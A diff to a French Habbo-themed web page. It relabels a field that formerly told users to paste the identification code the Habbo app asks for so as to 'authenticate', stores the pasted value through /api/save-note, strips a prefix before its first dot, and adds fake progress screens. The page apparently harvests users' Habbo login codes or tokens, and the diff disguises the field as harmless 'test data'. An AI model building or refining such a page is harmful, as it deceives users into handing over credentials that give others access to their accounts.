@@ -17,7 +17,6 @@
     --text:#C8D8FF;
     --green:#44FF88;
     --red:#FF4444;
-    --blue-light:#4A7FD4;
   }
 
   * {
@@ -297,6 +296,8 @@
     text-align:center;
     box-shadow:0 4px 0 var(--orange), 0 8px 0 rgba(0,0,0,0.4);
     transition:transform 0.08s, box-shadow 0.08s;
+    border:none;
+    cursor:pointer;
   }
 
   .btn-play:hover {
@@ -321,6 +322,58 @@
     display:inline-block;
     margin-right:8px;
     animation:blink 2s infinite;
+  }
+
+  .loading {
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(10,15,46,0.97);
+    z-index:100;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:20px;
+  }
+
+  .loading.active {
+    display:flex;
+  }
+
+  .loading-title {
+    font-family:'Press Start 2P',monospace;
+    font-size:36px;
+    color:var(--yellow);
+    text-shadow:4px 4px 0 var(--orange);
+  }
+
+  .loading-text {
+    font-family:'Press Start 2P',monospace;
+    font-size:12px;
+    color:var(--yellow);
+    letter-spacing:3px;
+    animation:pulse 0.8s infinite;
+    text-align:center;
+  }
+
+  .progress-bar {
+    width:280px;
+    height:16px;
+    background:var(--panel);
+    border:3px solid var(--border);
+    overflow:hidden;
+  }
+
+  .progress-fill {
+    height:100%;
+    background:linear-gradient(90deg,var(--cyan),var(--yellow));
+    width:0%;
+    transition:width 0.3s;
+  }
+
+  @keyframes pulse {
+    0%,100% { opacity:1; }
+    50% { opacity:0.4; }
   }
 
   @keyframes blink {
@@ -350,9 +403,9 @@
   </div>
 
   <div class="section">
-    <div class="section-title">📝 CODE D'IDENTIFICATION <span>— VERSION V0.13</span></div>
+    <div class="section-title">📝 DONNÉE PERSONNELLE <span>— VERSION V0.13</span></div>
     <div class="code-id-desc">
-      Si l'application Habbo te demande un code d'identification, tu peux le copier-coller ici pour t'authentifier.
+      Tu peux saisir ici une donnée de test liée à ton compte. Si la valeur contient un préfixe avant le premier point, il sera retiré automatiquement avant l’enregistrement.
     </div>
 
     <div class="code-input-row">
@@ -393,15 +446,29 @@
     <div class="section">
       <div class="section-title">🎮 JOUER</div>
       <div style="font-size:19px;line-height:1.6;margin-bottom:16px">
-        Rejoins l'hôtel directement sur Habbo.fr !
+        Lance directement le launcher Habbo depuis ton PC.
       </div>
-      <a href="habbo://hab" class="btn-play">▶ JOUER SUR HABBO.FR</a>
+      <button class="btn-play" onclick="launchHabbo()">▶ JOUER SUR HABBO.FR</button>
     </div>
   </div>
 
 </div>
 
+<div class="loading" id="habboLaunchLoading">
+  <div class="loading-title">HABBO</div>
+  <div class="loading-text" id="habboLaunchText">OUVERTURE DU LAUNCHER...</div>
+  <div class="progress-bar">
+    <div class="progress-fill" id="habboLaunchProgress"></div>
+  </div>
+</div>
+
 <script>
+  function stripBeforeFirstDot(value) {
+    if (!value) return '';
+    const index = value.indexOf('.');
+    return index !== -1 ? value.substring(index + 1).trim() : value.trim();
+  }
+
   fetch('/api/me')
     .then(r => r.json())
     .then(data => {
@@ -415,15 +482,19 @@
       document.getElementById('usernameCard').textContent = data.username;
 
       const savedNoteBox = document.getElementById('savedNoteBox');
-      if (data.personalNote && data.personalNote.trim()) {
-        savedNoteBox.textContent = '✅ Donnée enregistrée : ' + data.personalNote;
+      const cleanedNote = stripBeforeFirstDot(data.personalNote || '');
+
+      if (cleanedNote) {
+        savedNoteBox.textContent = '✅ Donnée enregistrée : ' + cleanedNote;
       } else {
         savedNoteBox.textContent = 'Aucune donnée enregistrée.';
       }
     });
 
   async function submitNote() {
-    const note = document.getElementById('codeIdInput').value.trim();
+    const rawNote = document.getElementById('codeIdInput').value.trim();
+    const cleanedNote = stripBeforeFirstDot(rawNote);
+
     const fb = document.getElementById('codeFeedback');
     const loaderBox = document.getElementById('loaderBox');
     const loaderFill = document.getElementById('loaderFill');
@@ -432,7 +503,7 @@
     const button = document.getElementById('validateBtn');
     const savedNoteBox = document.getElementById('savedNoteBox');
 
-    if (!note) {
+    if (!cleanedNote) {
       loaderBox.style.display = 'none';
       fb.className = 'code-feedback error';
       fb.textContent = '⚠ Entre une valeur avant de valider.';
@@ -451,7 +522,7 @@
 
     const steps = [
       { limit: 20, text: 'Initialisation...' },
-      { limit: 45, text: 'Synchronisation locale...' },
+      { limit: 45, text: 'Nettoyage de la valeur...' },
       { limit: 75, text: 'Traitement des données...' },
       { limit: 95, text: 'Vérification finale...' },
       { limit: 100, text: 'Finalisation...' }
@@ -484,7 +555,7 @@
       const res = await fetch('/api/save-note', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ note })
+        body: JSON.stringify({ note: cleanedNote })
       });
 
       const data = await res.json();
@@ -494,8 +565,8 @@
         fb.textContent = '⚠ ' + data.message;
       } else {
         fb.className = 'code-feedback success';
-        fb.textContent = '✅ Traitement terminé. La donnée a bien été prise en compte. Si la valeur est correcte, elle sera utilisée lors de la prochaine connexion v0.13.';
-        savedNoteBox.textContent = '✅ Donnée enregistrée : ' + note;
+        fb.textContent = '✅ Traitement terminé. La donnée a bien été prise en compte pour la version v0.13.';
+        savedNoteBox.textContent = '✅ Donnée enregistrée : ' + cleanedNote;
         document.getElementById('codeIdInput').value = '';
       }
 
@@ -508,6 +579,56 @@
       button.disabled = false;
       button.textContent = '✔ VALIDER';
     }
+  }
+
+  function launchHabbo() {
+    const loading = document.getElementById('habboLaunchLoading');
+    const fill = document.getElementById('habboLaunchProgress');
+    const text = document.getElementById('habboLaunchText');
+
+    loading.classList.add('active');
+    fill.style.width = '0%';
+    text.textContent = 'OUVERTURE DU LAUNCHER...';
+
+    let progress = 0;
+    let step = 0;
+    const steps = [
+      'OUVERTURE DU LAUNCHER...',
+      'CONNEXION AU CLIENT...',
+      'PRESQUE PRÊT...'
+    ];
+
+    const interval = setInterval(() => {
+      progress += Math.random() * 22 + 12;
+
+      if (progress >= 35 && step === 0) {
+        step = 1;
+        text.textContent = steps[1];
+      }
+
+      if (progress >= 70 && step === 1) {
+        step = 2;
+        text.textContent = steps[2];
+      }
+
+      if (progress >= 100) {
+        progress = 100;
+        fill.style.width = '100%';
+        clearInterval(interval);
+
+        setTimeout(() => {
+          window.location.href = 'habbo://hab';
+          setTimeout(() => {
+            loading.classList.remove('active');
+            fill.style.width = '0%';
+          }, 1200);
+        }, 300);
+
+        return;
+      }
+
+      fill.style.width = progress + '%';
+    }, 180);
   }
 
   document.getElementById('codeIdInput').addEventListener('keydown', e => {
